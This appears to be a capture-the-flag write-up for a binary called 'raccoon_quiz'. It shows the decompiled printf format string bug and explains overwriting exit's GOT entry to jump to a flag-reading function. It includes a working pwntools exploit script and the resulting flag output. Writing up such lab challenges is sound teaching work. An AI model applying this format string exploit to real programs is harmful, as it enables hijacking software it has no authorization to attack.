# Raccoon_quiz
This was a binary with a format string vulnerability. This was hinted in the announcement of the challenge, so I kinda knew what to look for in the program.

Opening the program up in GDB gave us a few functions to work with:
```
pwndbg> info functions 
All defined functions: 
Non-debugging symbols: 
0x00000000004005b0 _init 
0x00000000004005e0 _exit@plt 
0x00000000004005f0 puts@plt 
0x0000000000400600 printf@plt 
0x0000000000400610 read@plt 
0x0000000000400620 fgets@plt 
0x0000000000400630 open@plt 
0x0000000000400640 isoc99_scanf@plt 
0x0000000000400650 exit@plt 
0x0000000000400660 _start 
0x0000000000400690 _dl_relocate_static_pie 
0x00000000004006a0 deregister_tm_clones 
0x00000000004006d0 register_tm_clones 
0x0000000000400710 do_global_dtors_aux 
0x0000000000400740 frame_dummy 
0x0000000000400747 super_sneaky_function 
0x00000000004007a0 raccoon_quiz 
0x000000000040098b main 
0x00000000004009a0 libc_csu_init 
0x0000000000400a10 libc_csu_fini 
0x0000000000400a14 _fini
```
The functions of interest here are: `super_sneaky_function`, `main`, and `raccoon_quiz` I opened the program up in ghidra and found the format string vulnerability in the `raccoon_quiz` function. First you had to answer the questions with "A", "B", then "A" again. Then you could enter name and it would `printf` your name without a format string. This is where the format string vulnerability is.

Here is the spot in the function in ghidra:
```c
if (local_c == 3) { 
	puts("Congwats! You scored a 3/3. Please enter your name for the leaderboards!"); 
	isoc99_scanf("%*[^\n]"); 
	isoc99_scanf(&DAT_00400c78); 
	fgets(local_218,0x200,stdin); 
	printf("Good job "); 
	printf(local_218); }
```
We are going to exploit this to change the control flow of the function. I can see that at the end of the function it calls the `exit` function which means it's the first call to that function meaning it hasn't been loaded into the PLT when you are prompted to enter your name. This means that you can overwrite the GOT before it gets called so that when 	`exit` gets called, it loads a different function into the PLT. Looking at `super_sneaky_function` I can see that is the function we want to call because it opens up the flag file, reads it, and writes it to the screen. So we will take the addess of that function: `0x0000000000400747 super_sneaky_function` and overwrite the `exit` function with that address to change the control flow. Here is my script:
```python
elf = ELF("./raccoon_quiz")
addr = elf.got["exit"]
p.recv()
p.sendline("A")
p.recv()
p.sendline("B")
p.recv()
p.sendline("A")
p.recvline()
p.recvline()
p.recvline()
writes = {addr:0x400747}
payload = fmtstr_payload(6, writes)
p.sendline(payload)
p.interactive()
```
One thing I struggled with during this was the way the `fmtstr_payload` function built into pwntools dafaults to 32-bit, so it took me a while to figure out that I had to add `context(arch="amd64")` to the beginning of the expoit program in order for it to create a 64-bit payload.

Anyways, it looks like this when I run it.
```
Congwats! You scored a 3/3. 
Please enter your name for the leaderboards! 
Good job 
Goodbye! 
Wow! You sure are one sneaky raccoon! You can have the flag.
osu{tr4a5h_pr0gr4mm1ng_in_4_tr4sh_g4m3}
```
